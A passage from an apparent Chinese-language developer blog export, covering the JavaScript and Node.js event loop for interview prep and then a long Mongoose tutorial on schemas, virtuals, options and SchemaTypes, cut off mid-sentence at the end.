请求线程。当发起一个请求时，就是在创建一个线程，当请求结束的时候，该线程就可能会被销毁掉。 众所周知，JS 运行时会阻止 UI 渲染，这两个线程是互斥的，因为 JS 可以修改 Dom ，如果在 JS 执行的时候 Ui 线程还在工作，就可能会导致不能正常安全渲染 UI。这也是单线程的一个好处，得益于 JS 是单线程与很像的，可以达到节省呢欧村，节约上下文切换时间，没有锁的问题的好处。 执行栈可以把执行栈认为是一个存储函数调用的栈结构，遵循先进后出的原则 浏览器中的 Event Loop当遇到异步代码的时候，会被挂起并在需要执行的时候加入到 Task 队列中。一旦执行栈为空，Event Loop 就会从 Task 队列中拿出需要你执行的代码并放入执行栈中执行，所以本质上 JS 中的异步还是同步行为。 不同的任务源会被分配到不同的 Task 队列中，任务源可以分成 微任务（mocrotask） 和 宏任务（macrotask)。在 ES6 规范中，macrotask 被称为 task,microtask 被称为 jobs 。下面举个例子看看代码的执行顺序： 123456789101112131415161718192021222324252627console.log('script start')async function async1() &#123; await async2() console.log('async1 end')&#125;async function async2() &#123; console.log('async2 end')&#125;async1()setTimeout(function() &#123; console.log('setTimeout')&#125;, 0)new Promise(resolve =&gt; &#123; console.log('Promise') resolve()&#125;) .then(function() &#123; console.log('promise1') &#125;) .then(function() &#123; console.log('promise2') &#125;)console.log('script end') 当我们调用 async1 函数的时候，会马上输出 async2 end,并且函数返回一个 Promise，接下来在遇到 await 的时候就让出线程开始执行 async1 外的代码，可以完全把 await 看成是让出线程的标志。 然后当同步代码全部执行完毕以后，就会执行所有的异步代码，那么就会又回到 await 的位置执行返回的 Promise 的 resolve 函数，这又会把 resolve 丢到微任务队列中，接下来执行 then 中的回调，当两个 then 中的回调全部执行完毕后，回到 await 的位置处理返回值，这时候可以看成 Promise.resolve(返回值).then()，然后 await 后的代码全部被包裹进了 then 的回调中，所以 console.log(&#39;async1 end&#39;) 会优先执行于 setTimeout。 微任务包括 process.nextTick ，promise ，MutationObserver。 宏任务包括 script ， setTimeout ，setInterval ，setImmediate ，I/O ，UI rendering。 Event Loop 执行顺序如下所示： 首先执行同步代码，这属于宏任务 当执行完所有同步代码后，执行栈为空，查询是否有异步代码需要执行 执行所有微任务 当执行完所有微任务后，如有必要会渲染页面 然后开始下一轮 Event Loop，执行宏任务中的异步代码，也就是 setTimeout 中的回调函数 Node 中的 Event Loop 涉及的面试题：Node 中 Event Loop 和 浏览器的有什么不同？process.nextTick 执行顺序 Node 中的 Event Loop 分成6个阶段，它们会按照顺序反复运行，每当进入某一个阶段的时候，都会从对应的回调队列取出函数去执行。当队列为空或者执行的回调函数数量达到系统设定的阈值，就会进入下一个阶段 123456789101112131415161718┌──────────────────────────┐┌─&gt;│ timers ││ └──────────┬────────────┘│ ┌──────────┴────────────┐│ │ I/O callbacks ││ └──────────┬────────────┘│ ┌──────────┴────────────┐│ │ idle, prepare ││ └──────────┬────────────┘ ┌───────────────┐│ ┌──────────┴────────────┐ │ incoming: ││ │ poll │&lt;──connections─── ││ └──────────┬────────────┘ │ data, etc. ││ ┌──────────┴────────────┐ └───────────────┘│ │ check ││ └──────────┬────────────┘│ ┌──────────┴────────────┐└──┤ close callbacks │ └───────────────────────┘ timer timer 阶段会执行 setTimeout 和 setInerval 回调，并是由 poll 阶段控制的 同样，在 Node 中定时器指定的时间也不是准确的时间，只是尽快执行。 I/O I/O 阶段会处理上一轮循环中少数未执行的的 I/O 回调 dle,prepare idle,prepare 阶段内部实现 poll poll 阶段很重要，在这一阶段中，系统会做两件事情 执行到点的定时器 执行 poll 队列中的事件 并且当 poll 中没有定时器的情况下，会发现以下两件事情 如果poll队列不为空，会遍历回调队列并同步执行，直到队列为空或者系统限制 如果poll队列为空,会发生两件事情 如果有 setImmediate 需要执行的时候，poll 阶段会停止并且进入到 check 阶段执行 setImmediate 如果没有 setImmediate 需要执行，会等待回调被加入到队列中并立即执行回调，这里同样会有个超时时间设置防止一直等待下去 当然设定了 timer 的话且 poll 队列为空，则会判断是否有 timer 超时，如果有的话会回到 timer 阶段执行回调。 check check 阶段执行 setImmediate close callbacks close callbacks 阶段执行了 close 事件。 首先在有些情况下，定时器的执行顺序其实是随机的 123456setTimeout(() =&gt; &#123; console.log(&apos;setTimeout&apos;)&#125;, 0)setImmediate(() =&gt; &#123; console.log(&apos;setImmediate&apos;)&#125;) 对于以上代码来说，setTimeout 可能执行在前，也可能执行在后 首先 setTimeout(fn, 0) === setTimeout(fn, 1)，这是由源码决定的 进入事件循环也是需要成本的，如果在准备时候花费了大于 1ms 的时间，那么在 timer 阶段就会直接执行 setTimeout 回调 那么如果准备时间花费小于 1ms，那么就是 setImmediate 回调先执行了 当然在某些情况下，他们的执行顺序一定是固定的，比如以下代码： 当然在某些情况下，他们的执行顺序一定是固定的，比如以下代码： 12345678910const fs = require(&apos;fs&apos;)fs.readFile(__filename, () =&gt; &#123; setTimeout(() =&gt; &#123; console.log(&apos;timeout&apos;); &#125;, 0) setImmediate(() =&gt; &#123; console.log(&apos;immediate&apos;) &#125;)&#125;) 在上述代码中，setImmediate 永远先执行。因为两个代码写在 IO 回调中，IO 回调是在 poll 阶段执行，当回调执行完毕后队列为空，发现存在 setImmediate 回调，所以就直接跳转到 check 阶段去执行回调了。 process.nextTick 这个函数是独立于 Event Loop 之外的，它有一个自己的队列，当每个阶段完成之后，如果存在 nextTick 阶段，就会清空队列中的所有回调函数，并优于其他 microtask 执行 1234567891011121314151617181920212223242526setTimeout(() =&gt; &#123; console.log('timer1') Promise.resolve().then(function() &#123; console.log('promise1') &#125;)&#125;, 0)process.nextTick(() =&gt; &#123; console.log('nextTick') process.nextTick(() =&gt; &#123; console.log('nextTick') process.nextTick(() =&gt; &#123; console.log('nextTick') process.nextTick(() =&gt; &#123; console.log('nextTick') &#125;) &#125;) &#125;)&#125;)// nextTick// nextTick// nextTick// nextTick// timer1// promise1 参考链接：前端面试题目已经答案汇总 防抖]]></content>
      <categories>
        <category>前端面试</category>
      </categories>
      <tags>
        <tag>前端面试题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mongoose]]></title>
    <url>%2F2019-03-26-mongoose.html</url>
    <content type="text"><![CDATA[MongoDB是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。它支持的数据结构非常松散，是类似json的bson格式，因此可以存储比较复杂的数据类型。Mongo最大的特点是它支持的查询语言非常强大，其语法有点类似于面向对象的查询语言，几乎可以实现类似关系数据库单表查询的绝大部分功能，而且还支持对数据建立索引。 Mongoose是在node.js环境下对mongodb进行便捷操作的对象模型工具 学习链接 快速上手请先安装 MongoDB 和 Node.js。 下一步，npm安装Mongoose: 1npm i mongoose 连接数据库test 12const mongoose = require('mongoose');mongoose.connect('mongodb://localhost/test'); connect()返回一个状态待定（pending）的连接，接着我们加上成功和失败的提醒： 12345const db = mongoose.connection;db.on('error',console.error.bind(console,'connection error:'));db.once('open',function()&#123; // .. &#125;); 连接成功的时候，回调函数会被调用，假设下面所有函数都在这个回调函数里面。 Mongoose 里面一切始于 Schema。看一个简单的例子： 123const KittySchema = mongoose.Schema(&#123; name:String&#125;); 我们得到了一个带有 String类型的 name 属性的 schema,接着把这个 schema 编译成一个 Model: 1const Kitten = mongoose.model('Kitten',kittySchema); model 是我们创造的 document 的 Class。在例子中，每个 document 都是一个实例，它的属性和行为都会被声明在 schema 。 123456789const felyne = new Kitten(&#123;name:'Felyne'&#125;);felyne.name // 'Felyne';// 给 document 加一个 speak 方法KittySchema.methods.speak = function()&#123; const greeting = this.name ? "Meow name is " + this.name: "I don't have a name"; console.log(greeting);&#125;const Kitten = mongoose.model('Kitten',kittySchema); 加在 schema 的 methods 属性的函数会编译到 Model 的prototype,也会暴露搭配每个 document 实例： 12const a = new Kitten(&#123;name:'A'&#125;);a.speak(); // Meow name is A 每个 document 会在调用它的 save 方法后保存到数据库中，注意回调函数的第一个参数永远是 error 1234A.save(function(err,A)&#123; if(err) return console.error(err); A.speak();&#125;); 如果有很多个实例，可以用下面的方法来获取 model 里面的所有数据 1234Kitten.find(function(err,kittens)&#123; if(err) return console.error(err); console.log(kittens);&#125;) 模式（Schemas）定义一个schemaMongoose 的一切始于 Schema,每个 schama 都会映射到一个 MongoDB collection，并定义这个 collection 里面的文档的构成。 1234567891011121314151617const mongoose = require('mongoose');const Schema = mongoose.Schema;const blog = new Schema(&#123; title:String, author:String, body:String, comments:[&#123;body:String,date:Date&#125;], date:&#123; type:Date, defalut:Date.now &#125;, hidden:Boolean, meta:&#123; votes:Number, favs:Number &#125;&#125;); document 里面的每个属性都会被转换成在 blogSchema 里面对应的 SchemaType。例如 title 属性会被转换成为 SchemaType String,而 date属性会被转换成为 SchemaType Date。还可以像 meta属性一样，更加详细地指定嵌套在里面的属性类型。 运行使用的 SchemaTypes 有： String Number Boolean Date Buffer Mixed ObjectId Array Schema 的功能不只是定义文档结构和属性类型，还可以定义 document 的 instance methods model 的 static Model methods 复合索引 文档的生命周期钩子，也称为中间件 创建一个 modelmongoose.model(modelName,schema) 函数把 schema 转换为一个 Model: 1const Blog = mongoose.model('Blob',blogSchema); 实例方法（method）document 是 Models 的实例。Document 有很多自带的实例方法，当然也可以自定义我们自己的方法 123456// 定义一个 schemaconst animalSchema = new Schema(&#123;name:String,type:String&#125;);animalSchema.methods.findSimilarTypes = function(cb)&#123; return this.model('Animal').find(&#123;type:this.type&#125;,cb);&#125; 现在所有的 animal 实例都有 findSimilarTypes 方法： 123456const Animal = mongoose.model('Animal',animalSchema);const dog = new Animal(&#123;type：'dog'&#125;);dog.findSimilarTypes(function(err,dogs)&#123; console.log(dogs); // woof&#125;); 重写 mongoose 的默认方法会造成无法预料的结果 不要在自定义方法中使用 ES6 箭头函数，会造成 this 指向错误 静态方法（static）添加 Model 的静态方法也十分简单，继续使用 animalSchema 举例： 1234567animalSchema.statics.findByName = function(name,cb)&#123; return this.find(&#123;name:new RegExp(name,'i')&#125;,cb)&#125;const Animal = mongoose.model('Animal',animalSchema);Animal.findByName('fido',function(err,animals)&#123; console.log(animals);&#125;); 同样注意的是不要在静态方法中使用 ES6 的箭头函数 查询助手（query helper）查询助手作用于 query 实例，方便自定义扩展链式查询 1234567animalSchema.query.byName = function(name)&#123; return this.find(&#123;name:new RegExp(name,'i')&#125;);&#125;const Animal = mongoose.model('Animal',animalSchema);Animal.find().byName('fido').exec(function(err,animal)&#123; console.log(animals);&#125;); 索引（index）MongoDB 支持 secondary indexes。在 mongoose 中，我们在 Schema 定义索引。索引分字段级别和 schema 级别，复合索引需要在 schema 级别定义。 12345678910const animalSchema = new Schema(&#123; name:String, type:String, tags:&#123; type:[String], index:true &#125;&#125;);animalSchema.index(&#123;name:1,type:-1&#125;); 应用启动的时候，Mongoose 会自动调用 createIndex 初始化定义的索引。Mongoose 顺序处理每一个 createIndex，然后在 model 触发 ‘index’ 事件。在生产中建议禁止这种行为，因为创建索引会对性能造成重大影响。 12345mongoose.connect('mongodb://user:pass@localhost:port/database',&#123;autoIndex:false&#125;);// 或者mongoose.createConnection('mongodb://user:pass@localhost:port/database',&#123;autoIndex:false&#125;);// 或者new Schema(&#123;..&#125;,&#123;autoIndex:false&#125;); 索引创建完成或者失败，Mongoose 会触发 index 事件 1234567// Will cause an error because mongodb has an _id index by default that is not sparseanimalSchema.index(&#123;_id:1&#125;,&#123;sparse:true&#125;);const Animal = mongoose.model('Animal',animalSchema);Animal.on('index',function(err)&#123; // _id index cannot be sparse console.log(err);&#125;); 虚拟值（Virtual）Virtual 是 document 的属性，但是不会被保存到 MongoDB.getter 可以用于格式化和组合字段数据，setter 可以很方便地分解一个值到多个字段。 12345678910111213const personSchema = new Schema(&#123; name:&#123; first:String, last:String &#125;&#125;);const Person = mongoose.model('Person',personSchema);const axl = new Person(&#123; name:&#123;first:'Axl',last:'Rose'&#125;&#125;);console.log(axl.name.first + ' ' + axl.name.last); //Axl Rose 但是每次都要这样拼接就太麻烦了，使用 virtual property getter 这个方法允许定义一个 fullName 属性，但不必保存到数据库。 1234personSchema.virtual('fullName').get(function()&#123; return this.name.first + ' ' + this.name.last&#125;);console.log(axl.fullName); // Axl Rose 如果对 document 使用 toJSON（） 或 toObject() 默认不包括虚拟值，需要额外向 toObject 或者 toJSON 传入参数 {virtuals:true} 也可以设定虚拟值的 setter，下面的例子中，当赋值到虚拟值的时候，会自动拆分到其他属性 1234567personSchema.virtual('fullName').get(function()&#123; return this.name.first + ' ' + this.name.last&#125;).set(function(v)&#123; this.name.first = v.substr(0,v.indexOf(' ')); this.name.last = v.substr(v.indexOf(' ')+1);&#125;);axl.fullName = 'William Rose' // Now `axl.name.first` is "William" 需要注意的是，虚拟值不能用于查询和字段选择，因为虚拟值不存储在 MongoDB 别名（Alias）Aliase 是一种特殊的虚拟值，它的getter 和 setter 会无缝链接到另一个值，这是一个节省带宽的做法，可以存储一个更短的属性名到数据库，同时在调用的时候保持可读性。 12345678910111213const personSchema = new Schema(&#123; n:&#123; type:String, alias:'name' &#125;&#125;);const person = new Person(&#123;name:'Val'&#125;);person //&#123;n:'Val'&#125;person.toObject(&#123;virtuals:true&#125;) //&#123;n:'Val',name:'Val'&#125;person.name // Valperson.name = 'Not Val';person // &#123;n:'Not Val'&#125; 选项Schema 有很多可配置选项，可以在构造时传入或者直接 set 1234new Schema(&#123;...&#125;,options);const schema = new Schema(&#123;...&#125;);schema.set(option,value); 有效的选项： autoIndex bufferCommands capped collection id _id minimize read shardKey strict strictQuery toJSON toObject typekey validateBeforeSave versionKey skipVersioning timestamps useNestedStrict option：autoIndex 应用启动的时候，Mongoose 自动发送 createIndex 指令，schema 里面的每个 index 都会被创建，如果需要关闭自动创建功能或者需要在创建后进行一系列操作，可以把 autoIndex 设为 false，然后对 model 调用 ensureIndexes： 123const schema = new Schema(&#123;..&#125;,&#123;autoIndex:false&#125;);const Clock = mongoose.model('Clock',schema);Clock.ensureIndexes(callback); option：bufferCommands 默认情况下，mongoose buffers会在连接中断时发出命令，直到驱动程序重新连接为止。若要禁用缓冲，请将bufferCommands设置为false。 1const schema = new Schema(&#123;..&#125;,&#123;bufferCommands:false&#125;); schema 的bufferCommands 会重写全局的 bufferCommands 选项。 12mongoose.set('bufferCommands',true);const schema = new Schema(&#123;..&#125;,&#123;bufferCommands:false&#125;); option：capped Mongoose 支持 MongoDB 的 capped collections ，要从底层把 collection 设定为 capped(封顶)，可以把collection 的最大容量设定到 capped 选项（单位 bytes） 1new Schema(&#123;..&#125;,&#123;capped:1024&#125;); 如果要传递多个选项，capped 也可以作为对象传递.这个试试需要显式传入必要值 size 1new Schema(&#123;..&#125;,&#123;size:1024,max:1000,autoIndexId:true&#125;) option：collection Mongoose 通过 utils.toCollectionName 方法，默认生成 collection 的名称（生成 model 名称的复数形式）。设置这个选项可以自定义名称 1const dataSchema = new Schema(&#123;..&#125;,&#123;collection:'data'&#125;); option：id Mongoose 会默认生成一个虚拟值 id，指向文档的 _id字段。如果你不需要 id 虚拟值，可以通过这个选项禁用此功能。 1234567891011// 默认行为const schema = new Schema(&#123;name:String&#125;);const Page = mongoose.model('Page',schema);const p = new Page(&#123;name:'mongodb.org'&#125;);console.log(p.id); // 50341373e894ad16347efe01//禁止 idconst schema = new Schema(&#123;name:String&#125;,&#123;id:false&#125;);const Page = mongoose.model('Page',schema);const p = new Page(&#123;name:'mongodb.org'&#125;);console.log(p.id); // undefined option：_id Mongoose 默认给你的 Schema 赋值一个 _id，这个值的类型是 ObjectId，这与 MongoDB 的默认表现一致。如果需要，可以禁止 此选项只能用于 subdocument。 Mongoose 不能保存没有id的文档，如果硬是要这么做，会报错。 1234567891011// 默认行为const schema = new Schema(&#123;name:String&#125;);const Page = mongoose.model('Page',schema);const p = new Page(&#123;name:'mongodb.org'&#125;);console.log(p); // &#123; _id: '50341373e894ad16347efe01', name: 'mongodb.org' &#125;// 禁止 _idconst schema = new Schema(&#123;name:String&#125;,&#123;_id:false&#125;);const Page = mongoose.model('Page',schema);const p = new Page(&#123;name:'mongodb.org'&#125;);console.log(p); // &#123; name: 'mongodb.org' &#125; option：minimize Mongoose 默认不保存空对象。 123456789101112const schema = new Schema(&#123;name:String,inventory:&#123;&#125;&#125;);const Character = mongoose.model('Character',schema);const frodo = new Character(&#123;name:'Frodo',inventory:&#123;ringOfPower:1&#125;&#125;);Character.findOne(&#123;name:'Frodo'&#125;,function(err,character)&#123; console.log(character); // &#123;name: 'Frodo', inventory: &#123; ringOfPower: 1 &#125;&#125;&#125;);const Sam = new Character(&#123;name:'Sam',inventory:&#123;&#125;&#125;);Character.findOne(&#123;name:'Sam'&#125;,function(err,character)&#123; console.log(character); // &#123;name: 'Sam'&#125;&#125;); 如果把 minimize 设定为 false,Mongoose 将保存空对象 1234const Sam = new Character(&#123;name:'Sam',inventory:&#123;&#125;&#125;,&#123;minimize:false&#125;);Character.findOne(&#123;name:'Sam'&#125;,function(err,character)&#123; console.log(character); // &#123;name: 'Sam',inventory:&#123;&#125;&#125;&#125;); option：read 12345const schema = new Schema(&#123;..&#125;, &#123; read: 'primary' &#125;);// also aliased as 'p'const schema = new Schema(&#123;..&#125;, &#123; read: 'primaryPreferred' &#125;);// aliased as 'pp'const schema = new Schema(&#123;..&#125;, &#123; read: 'secondary' &#125;);// aliased as 's'const schema = new Schema(&#123;..&#125;, &#123; read: 'secondaryPreferred' &#125;);// aliased as 'sp'const schema = new Schema(&#123;..&#125;, &#123; read: 'nearest' &#125;);// aliased as 'n' 12345const options = &#123; replset: &#123; strategy: 'ping' &#125;&#125;;mongoose.connect(uri, options);const schema = new Schema(&#123;..&#125;, &#123; read: ['nearest', &#123; disk: 'ssd' &#125;] &#125;);mongoose.model('JellyBean', schema); option：shardKey 分片相关. 1new Schema(&#123; .. &#125;, &#123; shardKey: &#123; tag: 1, name: 1 &#125;&#125;) option：strict Strict 选项默认为 true，这意味着你不能 save schema 里没有声明的属性。 123456789const thingSchema = new Schema(&#123;..&#125;)const Thing = mongoose.model('Thing', thingSchema);const thing = new Thing(&#123; iAmNotInTheSchema: true &#125;);thing.save(); // iAmNotInTheSchema is not saved to the db// set to false..const thingSchema = new Schema(&#123;..&#125;, &#123; strict: false &#125;);const thing = new Thing(&#123; iAmNotInTheSchema: true &#125;);thing.save(); // iAmNotInTheSchema is now saved to the db!! doc.set() 也受该选项影响： 12345const thingSchema = new Schema(&#123;..&#125;)const Thing = mongoose.model('Thing', thingSchema);const thing = new Thing;thing.set('iAmNotInTheSchema', true);thing.save(); // iAmNotInTheSchema is not saved to the db 这个值可以在 model 级别重写，在第二个参数值传入： 123const Thing = mongoose.model('Thing');const thing = new Thing(doc, true); // enables strict modeconst thing = new Thing(doc, false); // disables strict mode 还可以将strict选项设置为“throw”，这将导致产生错误，而不是删除坏数据。 注意:在 schema 中不存在的实例上设置的任何键/值总是被忽略，不管模式选项是什么。 12345const thingSchema = new Schema(&#123;..&#125;)const Thing = mongoose.model('Thing', thingSchema);const thing = new Thing;thing.iAmNotInTheSchema = true;thing.save(); // iAmNotInTheSchema is never saved to the db option：strictQuery 12345const mySchema = new Schema(&#123; field: Number &#125;, &#123; strict: true &#125;);const MyModel = mongoose.model('Test', mySchema);// Mongoose will **not** filter out `notInSchema: 1`, despite `strict: true`MyModel.find(&#123; notInSchema: 1 &#125;); 严格的选择适用于更新 12// Mongoose will strip out `notInSchema` from the update if `strict` is not `false`MyModel.updateMany(&#123;&#125;, &#123; $set: &#123; notInSchema: 1 &#125; &#125;); Mongoose 有一个单独的 strictQuery 选项，用于将过滤器参数的strict模式切换到查询。 12345678const mySchema = new Schema(&#123; field: Number &#125;, &#123; strict: true, strictQuery: true // Turn on strict mode for query filters&#125;);const MyModel = mongoose.model('Test', mySchema);// Mongoose will strip out `notInSchema: 1` because `strictQuery` is `true`MyModel.find(&#123; notInSchema: 1 &#125;); option：toJSON 与toObject选项完全相同，但仅在调用documents toJSON方法时才适用。 12345678910const schema = new Schema(&#123;name:String&#125;);schema.path('name').get(function(v)&#123; return v +' is my name';&#125;);schema.set('toJSON',&#123;getters:true,virituals:false&#125;);const M = mongoose.model('Person',schema);const m = new M(&#123;name:'Max Headroom'&#125;); m.toObject(); // &#123;_id: 504e0cd7dd992d9be2f20b6f, name: 'Max Headroom' &#125;m.toJSON(); // &#123;_id: 504e0cd7dd992d9be2f20b6f, name: 'Max Headroom is my name' &#125;JSON.stringfy(m); // &#123; "_id": "504e0cd7dd992d9be2f20b6f", "name": "Max Headroom is my name" &#125; option：toObject Documents 的 toObject 方法可以把文档转换成一个 plain javascript object （也就是去掉里面的方法）。 这是一个可以接收多个参数的方法，我们可以在 schemas 定义这些参数。 例如要打印出虚拟值，可以向 toObject 传入 { getters: true }： 12345678const schema = new Schema(&#123;name:String&#125;);schema.path('name').get(function(v)&#123; return v + 'is my name'&#125;);schema.set('toObject',&#123;getters:true&#125;);const M = mongoose.model('Person',schema);const m = new M(&#123;name:'HAHA'&#125;);m // &#123; _id: 504e0cd7dd992d9be2f20b6f, name: 'HAHA is my name' &#125; option：typekey 类型声明 1const schema = new Schema(&#123;loc:&#123;type:String,coordinates:[Number]&#125;&#125;); 对于像geoJSON这样的应用程序，“type”属性非常重要。控制使用哪个键mongoose来查找类型声明，要设置“typeKey”模式选项 123456789const schema = new Schema(&#123; loc:&#123; type:String, coordinates:[Number], &#125;, name:&#123; $type:String &#125;&#125;,&#123;typeKey:'$type'&#125;); option：validateBeforeSave 默认情况下，文档在保存到数据库之前会自动验证。这是为了防止保存无效的文档。如果希望手动处理验证，并能够保存没有通过验证的对象，可以将validatebeforeave设置为false。 1234567891011const schema = new Schema(&#123; name: String &#125;);schema.set('validateBeforeSave', false);schema.path('name').validate(function (value) &#123; return v != null;&#125;);const M = mongoose.model('Person', schema);const m = new M(&#123; name: null &#125;);m.validate(function(err) &#123; console.log(err); // Will tell you that null is not allowed.&#125;);m.save(); // Succeeds despite being invalid option：versionKey versionKey 是 Mongoose 在文件创建时自动设定的。 这个值包含文件的内部修订号。 versionKey 是一个字符串，代表版本号的属性名， 默认值为 __v。如果这个值与你的计划冲突，你可以设定为其他名称： 12345678910const schema = new Schema(&#123; name: 'string' &#125;);const Thing = mongoose.model('Thing', schema);const thing = new Thing(&#123; name: 'mongoose v3' &#125;);thing.save(); // &#123; __v: 0, name: 'mongoose v3' &#125;// customized versionKeynew Schema(&#123;..&#125;, &#123; versionKey: '_somethingElse' &#125;)const Thing = mongoose.model('Thing', schema);const thing = new Thing(&#123; name: 'mongoose v3' &#125;);thing.save(); // &#123; _somethingElse: 0, name: 'mongoose v3' &#125; 你也可以赋值为 false 禁用 versionKey。 1234const Schema(&#123;..&#125;, &#123; versionKey: false &#125;);const Thing = mongoose.model('Thing', schema);const thing = new Thing(&#123; name: 'no versioning please' &#125;);thing.save(); // &#123; name: 'no versioning please' &#125; option：collation 为 查询（query）和 聚合（aggregation）设置 collation 123456789101112131415const schema = new Schema(&#123; name:String&#125;,&#123; collaction:&#123; locale:'en_US', strength:1 &#125;&#125;)const MyModel = db.model('MyModel',schema);myModel.create([&#123;name:'val',&#123;name:'Val'&#125;]).then(function()&#123; return MyModel.find(&#123;name:'Val'&#125;);&#125;).then(function(docs)&#123; // docs 里面会包含上面两个值，因为 strength：1 代表着忽略大小写&#125;); option：skipVersioning 跳过版本控制允许从版本控制中排除路径(例如。，即使更新了这些路径，也不会增加内部修订)。除非你知道你在做什么，否则不要这样做。对于子文档，使用完全限定路径将其包含在父文档中。 123new Schema(&#123;..&#125;, &#123; skipVersioning: &#123; dontVersionMe: true &#125; &#125;);thing.dontVersionMe.push('hey');thing.save(); // version is not incremented option：timestamps 如果设置了 timestamps 选项, mongoose 会在你的 schema 自动添加 createdAt 和 updatedAt 字段， 其类型为Date。这两个字段的默认名称是 createAt和 updateAt，你可以通过设定 timestamps.createAt 和 timestamps.updateAt 自定义名称。 1234const thingSchema = new Schema(&#123;..&#125;, &#123; timestamps: &#123; createdAt: 'created_at' &#125; &#125;);const Thing = mongoose.model('Thing', thingSchema);const thing = new Thing();thing.save(); // `created_at` &amp; `updatedAt` will be included option：useNestedStrict 在 mongoose4 中，update() 和 findOneAndUpdate()只检查顶层 schema 的严格模式设定。 12345678910111213const childSchema = new Schema(&#123;&#125;, &#123; strict: false &#125;);const parentSchema = new Schema(&#123; child: childSchema &#125;, &#123; strict: 'throw' &#125;);const Parent = mongoose.model('Parent', parentSchema);Parent.update(&#123;&#125;, &#123; 'child.name': 'Luke Skywalker' &#125;, function(error) &#123; // 报错！原因是父Schema设定为`strict: throw`，但是因为只检查顶层，导致 // 子Schema的 `strict: false` 遭到无情忽视&#125;);const update = &#123; 'child.name': 'Luke Skywalker' &#125;;const opts = &#123; strict: false &#125;;Parent.update(&#123;&#125;, update, opts, function(error) &#123; // 这样可以，因为重写了父Schema的 strict 选项&#125;); 如果你把 useNestedStrict 设为 true，mongoose 就不会忽略嵌套的 strict 设定。 1234567const childSchema = new Schema(&#123;&#125;, &#123; strict: false &#125;);const parentSchema = new Schema(&#123; child: childSchema &#125;, &#123; strict: 'throw', useNestedStrict: true &#125;);const Parent = mongoose.model('Parent', parentSchema);Parent.update(&#123;&#125;, &#123; 'child.name': 'Luke Skywalker' &#125;, function(error) &#123; // Works!&#125;); 模式类型（SchemaTypes）SchemaTypes 是处理字段路径各种属性的定义（默认值、验证、getter、setter、查询的字段选择默认值，以及字符串和数字的其他一般特性） 下面是合法的 SchemaTypes： String Number Date Buffer Boolean Mixed ObjectId Array Decimal128 例子： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556const schema = new Schema(&#123; name:String, binary:Buffer, living:Boolean, updated:&#123; type:Date, default:Date.now &#125;, age:&#123; type:Number, min:18, max:65 &#125;, mixed:Schema.Types.Mixed, _someId:Schema.Types.ObjectId, decimal:Schema.Types.Decimal128, array:[], ofString:[String], ofNumber:[Number], ofDates:[Date], ofBuffer:[Buffer], ofBoolean:[Boolean], ofMixed:[Schema.Types.Mixed], ofObjectId:[Schema.Types.ObjectId], ofArrays:[[]], ofArrayOfNumbers:[[Number]], nested:&#123; stuff:&#123; type:String, lowercase:true, trim:true &#125; &#125;&#125;);const Thing = mongoose.model('Thing',schema);const m = new Thing;m.name = 'haha';m.age = 125;m.updated = new Date;m.binary = new Buffer(0);m.mixed = &#123; any:&#123; thing:'i want' &#125;&#125;m.markModified('mixed');m._someId = new mongoose.Typed.ObjectId;m.array.push(1);m.ofString.push('strings!');m.ofNumber.unshift(1,2,3,4);m.ofDates.addToSet(new Date);m.ofBuffer.pop();m.ofMixed = [1,[],'three',&#123;four:5&#125;]m.nested.stuff = 'good';m.save(callback); SchemaType 选项可以直接声明 schema type 为某一种 type，或者赋值一个含有 type 属性的对象 12345678const schema = new Schema(&#123; test:String&#125;);const schema2 = new Schema(&#123; test:&#123; type:String &#125;&#125;); 除了 type 属性，还可以对这个字段路径指定其他属性，如果要在保存之前把字母都改成小写： 123456const schema2 = new Schema(&#123; test:&#123; type:String, lowercase:true &#125;&#125;); lowercase 属性只作用于字符串。以下有一些全部type 可用的选项和一些限定部分 type 使用的选项。 全部可用 required：布尔值或者函数，如果值为真，为此属性添加 required 验证器 default：任何值或者函数设置此路径默认值，如果是函数，函数返回值为默认值 select：布尔值执行query 默认 projections validate：属性验证函数 get：函数 使用 Object.defineProperty() 定义自定义 getter set：函数 使用 Object.defineProperty() 定义自定义 setter alias：字符串 仅mongoose &gt;= 4.10.0。 为该字段路径定义虚拟值 gets/sets 1234567891011121314151617const numberSchema = new Schema(&#123; integerOnly:&#123; type:Number, get:v =&gt; Math.round(v), set:v =&gt; Math.round(v), alias:'i' &#125;&#125;);const Number = mongoose.model('Number',numberSchema);const doc = new Number();doc.integerOnly = 2.001;doc.integerOnly // 2doc.i // 2doc.i = 3.001;doc.integerOnly //3doc.i //3 索引相关 可以使用 schema type 选项定义 MongoDB indexex index:布尔值 是否对这个属性创建索引 unique:布尔值 是否对这个属性创建唯一索引 sparse:布尔值 是否对这个属性创建稀疏索引 1234567const schema = new Schema(&#123; test:&#123; type:String, index:true, unique:true &#125;&#125;); String lowercase: 布尔值 是否保存前对此值调用 .toLowerCase() uppercase: 布尔值 是否保存前对此值调用 .toUpperCase() trim: 布尔值 是否在保存前对此值调用 trim() match:正则表达式 创建验证器检查这个值是否匹配给定正则表达式 enum:数组 创建验证器检查这个值是否包含于给定数组 Number min:数值 创建验证器检查属性是否大于或者等于该值 max:数值 创建验证器检查属性是否小于或者等于该值 Date min:Date max:Date 使用注意Dates 内建的 Date 方法不会触发 mongoose 修改跟踪逻辑，如果使用 setMonth() 修改文档里面的 Date,mongoose 在 doc.save() 的时候是察觉不到这个文档发生了变化的，因此保存不到数据库中。如果一定要用内建的 Date 方法，需要手动调用 doc.markModified(&#39;pathToYourDate&#39;)告诉 mongoose 修改了数据。 1234567const Assignment = mongoose.model('Assignment',&#123;dueDate:Date&#125;);Assignment.findOne(function(err,doc)&#123; doc.dueDate.setMonth(3); doc.save(callback); // 这个不会保存你的修改 doc.markModified('dueDate'); doc.save(callback);&#125;); Mixed 一个什么都可以放的 SchemaType,虽然遍历，但是也会让数据难以维护。Mixed 可以通过 Schema.Types.Mixed 或者传入 一个空对象定义。下面三种方法效果是一致的。 123const Any = new Schema(&#123;any:&#123;&#125;&#125;);const Any = new Schema(&#123;any:Object&#125;);const Any = new Schema(&#123;any:Schema.Types.Mixed&#125;); 因为这是个 schema-less type，所以可以赋值为任意类型，但是 mongoose 无法自动检测并保存修改。要告诉它修改了 Mixed type 的值，调用文档的 .markModified(path) 方法，传入你的 Mixed 字段路径 123person.anything = &#123;x:[3,4,&#123;y:'changed'&#125;]&#125;person.markModified('anything');person.save(); // anything will now get changed ObjectIds 要指定类型为 ObjectId，在声明中使用 